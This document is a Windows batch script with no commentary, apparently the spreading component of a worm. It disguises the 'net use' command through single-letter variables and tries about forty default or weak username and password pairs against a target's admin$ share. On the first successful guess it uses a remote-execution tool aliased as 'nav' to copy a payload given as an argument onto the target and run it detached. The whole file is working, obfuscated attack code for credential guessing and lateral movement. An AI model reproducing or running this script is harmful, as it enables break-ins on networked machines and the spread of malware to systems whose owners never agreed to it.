@echo off
set F=u
set Z=s
set B=n
set L=e
set U=t
set G=e
set x=if not errorlevel 1 goto
set m=nav
set !=administrator
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "xxyyzz" /user:administrator
%x% rooo29
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "abc" /user:admin
%x% rooo30
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "student" /user:student
%x% rooo31
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "teacher" /user:teacher
%x% rooo32
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "" /user:user
%x% rooo33
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "user" /user:user
%x% rooo34
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "test" /user:test
%x% rooo4
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "test123" /user:administrator
%x% rooo5
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "1" /user:administrator
%x% rooo26
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "123" /user:administrator
%x% rooo27
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "12345" /user:admin
%x% rooo28
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "temp" /user:administrator
%x% rooo6
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "" /user:administrator
%x% rooo1
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "" /user:administrator
%x% rooo35
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "Administrator" /user:administrator
%x% rooo2
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "Administrator" /user:administrator
%x% rooo37
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "test" /user:administrator
%x% rooo3
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "admin" /user:administrator
%x% rooo10
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "temp123" /user:administrator
%x% rooo7
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "pass" /user:administrator
%x% rooo8
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "password" /user:administrator
%x% rooo9
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "root" /user:root
%x% rooo11
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "changeme" /user:administrator
%x% rooo12
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "admin" /user:admin
%x% rooo13
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "123456" /user:administrator
%x% rooo14
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "654321" /user:administrator
%x% rooo15
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "abc123" /user:administrator
%x% rooo16
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "12345" /user:administrator
%x% rooo36
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "red123" /user:administrator
%x% rooo17
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "admin123" /user:administrator
%x% rooo18
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "qwerty" /user:administrator
%x% rooo19
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "asdf" /user:administrator
%x% rooo20
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "password123" /user:administrator
%x% rooo21
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "secret" /user:administrator
%x% rooo22
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "qwertyuiop" /user:administrator
%x% rooo23
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "12345" /user:administrator
%x% rooo24
%B%%L%%U% %F%%Z%%G% \\%1\admin$ "54321" /user:administrator
%x% rooo25
goto roooend
:rooo1
%m% \\%1 -u %!% -p "" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "" -f -c -d %2 -o
%m% \\%1 -u %!% -p "" -d %2 -o
goto roooend
:rooo10
%m% \\%1 -u %!% -p "admin" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "admin" -f -c -d %2 -o
%m% \\%1 -u %!% -p "admin" -d %2 -o
goto roooend
:rooo2
%m% \\%1 -u %!% -p "administrator" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "administrator" -f -c -d %2 -o
%m% \\%1 -u %!% -p "administrator" -d %2 -o
goto roooend
:rooo37
%m% \\%1 -u %!% -p "Administrator" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "Administrator" -f -c -d %2 -o
%m% \\%1 -u %!% -p "Administrator" -d %2 -o
goto roooend
:rooo11
%m% \\%1 -u root -p "root" -d attrib.exe -r %2
%m% \\%1 -u root -p "root" -f -c -d %2 -o
%m% \\%1 -u root -p "root" -d %2 -o
goto roooend
:rooo13
%m% \\%1 -u admin -p "admin" -d attrib.exe -r %2
%m% \\%1 -u admin -p "admin" -f -c -d %2 -o
%m% \\%1 -u admin -p "admin" -d %2 -o
goto roooend
:rooo3
%m% \\%1 -u %!% -p "test" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "test" -f -c -d %2 -o
%m% \\%1 -u %!% -p "test" -d %2 -o
goto roooend
:rooo4
%m% \\%1 -u test -p "test" -d attrib.exe -r %2
%m% \\%1 -u test -p "test" -f -c -d %2 -o
%m% \\%1 -u test -p "test" -d %2 -o
goto roooend
:rooo5
%m% \\%1 -u %!% -p "test123" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "test123" -f -c -d %2 -o
%m% \\%1 -u %!% -p "test123" -d %2 -o
goto roooend
:rooo6
%m% \\%1 -u %!% -p "temp" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "temp" -f -c -d %2 -o
%m% \\%1 -u %!% -p "temp" -d %2 -o
goto roooend
:rooo7
%m% \\%1 -u %!% -p "temp123" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "temp123" -f -c -d %2 -o
%m% \\%1 -u %!% -p "temp123" -d %2 -o
goto roooend
:rooo8
%m% \\%1 -u %!% -p "pass" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "pass" -f -c -d %2 -o
%m% \\%1 -u %!% -p "pass" -d %2 -o
goto roooend
:rooo9
%m% \\%1 -u %!% -p "password" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "password" -f -c -d %2 -o
%m% \\%1 -u %!% -p "password" -d %2 -o
goto roooend
:rooo12
%m% \\%1 -u %!% -p "changeme" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "changeme" -f -c -d %2 -o
%m% \\%1 -u %!% -p "changeme" -d %2 -o
goto roooend
:rooo14
%m% \\%1 -u %!% -p "123456" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "123456" -f -c -d %2 -o
%m% \\%1 -u %!% -p "123456" -d %2 -o
goto roooend
:rooo15
%m% \\%1 -u %!% -p "654321" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "654321" -f -c -d %2 -o
%m% \\%1 -u %!% -p "654321" -d %2 -o
goto roooend
:rooo16
%m% \\%1 -u %!% -p "abc123" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "abc123" -f -c -d %2 -o
%m% \\%1 -u %!% -p "abc123" -d %2 -o
goto roooend
:rooo17
%m% \\%1 -u %!% -p "red123" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "red123" -f -c -d %2 -o
%m% \\%1 -u %!% -p "red123" -d %2 -o
goto roooend
:rooo18
%m% \\%1 -u %!% -p "admin123" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "admin123" -f -c -d %2 -o
%m% \\%1 -u %!% -p "admin123" -d %2 -o
goto roooend
:rooo19
%m% \\%1 -u %!% -p "qwerty" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "qwerty" -f -c -d %2 -o
%m% \\%1 -u %!% -p "qwerty" -d %2 -o
goto roooend
:rooo20
%m% \\%1 -u %!% -p "asdf" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "asdf" -f -c -d %2 -o
%m% \\%1 -u %!% -p "asdf" -d %2 -o
goto roooend
:rooo21
%m% \\%1 -u %!% -p "password123" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "password123" -f -c -d %2 -o
%m% \\%1 -u %!% -p "password123" -d %2 -o
goto roooend
:rooo22
%m% \\%1 -u %!% -p "secret" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "secret" -f -c -d %2 -o
%m% \\%1 -u %!% -p "secret" -d %2 -o
goto roooend
:rooo23
%m% \\%1 -u %!% -p "qwertyuiop" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "qwertyuiop" -f -c -d %2 -o
%m% \\%1 -u %!% -p "qwertyuiop" -d %2 -o
goto roooend
:rooo24
%m% \\%1 -u %!% -p "12345" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "12345" -f -c -d %2 -o
%m% \\%1 -u %!% -p "12345" -d %2 -o
goto roooend
:rooo25
%m% \\%1 -u %!% -p "54321" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "54321" -f -c -d %2 -o
%m% \\%1 -u %!% -p "54321" -d %2 -o
goto roooend
:rooo26
%m% \\%1 -u %!% -p "1" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "1" -f -c -d %2 -o
%m% \\%1 -u %!% -p "1" -d %2 -o
goto roooend
:rooo27
%m% \\%1 -u %!% -p "123" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "123" -f -c -d %2 -o
%m% \\%1 -u %!% -p "123" -d %2 -o
goto roooend
:rooo28
%m% \\%1 -u admin -p "12345" -d attrib.exe -r %2
%m% \\%1 -u admin -p "12345" -f -c -d %2 -o
%m% \\%1 -u admin -p "12345" -d %2 -o
goto roooend
:rooo29
%m% \\%1 -u %!% -p "xxyyzz" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "xxyyzz" -f -c -d %2 -o
%m% \\%1 -u %!% -p "xxyyzz" -d %2 -o
goto roooend
:rooo30
%m% \\%1 -u admin -p "abc" -d attrib.exe -r %2
%m% \\%1 -u admin -p "abc" -f -c -d %2 -o
%m% \\%1 -u admin -p "abc" -d %2 -o
goto roooend
:rooo31
%m% \\%1 -u student -p "student" -d attrib.exe -r %2
%m% \\%1 -u student -p "student" -f -c -d %2 -o
%m% \\%1 -u student -p "student" -d %2 -o
goto roooend
:rooo32
%m% \\%1 -u teacher -p "teacher" -d attrib.exe -r %2
%m% \\%1 -u teacher -p "teacher" -f -c -d %2 -o
%m% \\%1 -u teacher -p "teacher" -d %2 -o
goto roooend
:rooo33
%m% \\%1 -u user -p "" -d attrib.exe -r %2
%m% \\%1 -u user -p "" -f -c -d %2 -o
%m% \\%1 -u user -p "" -d %2 -o
goto roooend
:rooo34
%m% \\%1 -u user -p "user" -d attrib.exe -r %2
%m% \\%1 -u user -p "user" -f -c -d %2 -o
%m% \\%1 -u user -p "user" -d %2 -o
goto roooend
:rooo35
%m% \\%1 -u %!% -p "" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "" -f -c -d %2 -o
%m% \\%1 -u %!% -p "" -d %2 -o
goto roooend
:rooo36
%m% \\%1 -u %!% -p "12345" -d attrib.exe -r %2
%m% \\%1 -u %!% -p "12345" -f -c -d %2 -o
%m% \\%1 -u %!% -p "12345" -d %2 -o
goto roooend
:roooend
